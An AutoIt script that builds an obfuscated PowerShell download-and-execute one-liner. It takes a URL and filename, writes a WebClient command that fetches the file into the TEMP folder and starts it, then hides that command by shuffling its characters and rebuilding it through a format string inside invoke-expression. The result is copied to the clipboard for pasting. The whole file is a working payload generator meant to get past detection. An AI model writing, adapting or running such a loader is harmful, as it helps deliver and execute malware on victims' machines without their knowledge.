#include <array.au3>
#include "winapi.au3"
ConsoleWrite('Read the README.txt file for instruction')
$url = $cmdLine[1]
$filename = $cmdLine[2]
$command ="(new-object System.Net.WebClient).DownloadFile('" & $url & "', $env:TEMP + '\" & $filename & "');Start-Process($env:TEMP + '\" & $filename & "');"
Local $chars[] = []
$char_array = StringToASCIIArray($command)
for $i=0 to UBound($char_array) -1
   _ArrayAdd($chars,Chrw($char_array[$i]))
Next
_ArrayShuffle($chars)
$end = '"'
for $i=0 to UBound($char_array)-1
$end &= "{" & Search(Chrw($char_array[$i]),$chars) & "}"
Next
$end &='" -f '
for $i=0 to UBound($chars)-1
$end &= '"' & $chars[$i] & '"' & ","
Next
$end = StringTrimRight($end,1)
ConsoleWrite('invoke-expression(' & $end  & ")" & @CRLF)
ClipPut('invoke-expression(' & $end  & ")")
MsgBox(0,"","The code has been put into your clipboard.")
Func Search($char,$array)

   for $i=0 to UBound($array)-1
;~ ConsoleWrite($array[$i] & @CRLF)
	if StringCompare($array[$i],$char,1) = 0 Then
		 Return $i
		 EndIf
	  Next
	  return "error"
EndFunc
